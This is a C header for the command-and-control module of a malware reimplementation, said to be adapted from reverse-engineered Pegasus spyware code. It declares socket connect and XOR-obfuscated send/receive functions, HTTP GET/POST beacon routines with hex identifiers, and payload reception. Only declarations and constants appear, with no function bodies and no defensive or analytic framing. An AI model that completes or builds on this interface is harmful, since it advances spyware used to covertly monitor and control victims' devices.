// graphite_http.h - HTTP/C2 Communication (C)
// Adapted from Pegasus (libsgn) reverse-engineered native code
// Features: socket connect, send/receive with XOR encryption,
//           HTTP header parsing, payload reception

#ifndef GRAPHITE_HTTP_H
#define GRAPHITE_HTTP_H

#include <stddef.h>

#ifdef _WIN32
    #define HTTP_EXPORT __declspec(dllexport)
    #include <winsock2.h>
    #include <ws2tcpip.h>
#else
    #define HTTP_EXPORT __attribute__((visibility("default")))
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <poll.h>
#endif

#ifdef __cplusplus
extern "C" {
#endif

#define GRAPHITE_XOR_BYTE 0xad
#define GRAPHITE_HTTP_LINE 1024
#define GRAPHITE_HDR_END "\r\n\r\n"
#define GRAPHITE_RECV_POLL_MS 5000
#define GRAPHITE_RECV_POLL_RETRIES 3

// Socket operations
HTTP_EXPORT int socket_connect(int *out_fd, const char *host, unsigned port);
HTTP_EXPORT int socket_disconnect(int *fd);
HTTP_EXPORT int do_socket_send(int fd, const void *buf, size_t len, int xor_body);
HTTP_EXPORT int do_socket_receive(int fd, void *buf, size_t len, int xor_body);

// HTTP operations
HTTP_EXPORT int http_get_string_attribute(const void *hdr, size_t hdr_len,
                                          const char *name, char *out, int out_max);
HTTP_EXPORT int http_get_int_attribute(const void *hdr, size_t hdr_len,
                                       const char *name, long *out);
HTTP_EXPORT int http_receive_header(int fd, void **out_hdr, int *out_len);
HTTP_EXPORT int http_receive_payload(int fd, void **out_body, size_t *out_len);

// HTTP request/response
HTTP_EXPORT int http_send_request_with_get(const char *gi_hex, const char *bf_hex,
                                           const char *host, int fd);
HTTP_EXPORT int http_send_response_with_post(const char *gi_hex, const char *bf_hex,
                                             const char *host, const void *body,
                                             size_t body_len, int fd);

// Utility
HTTP_EXPORT void* find_bytes(const void *hay, size_t hay_n,
                            const void *needle, size_t needle_n);

#ifdef __cplusplus
}
#endif

#endif
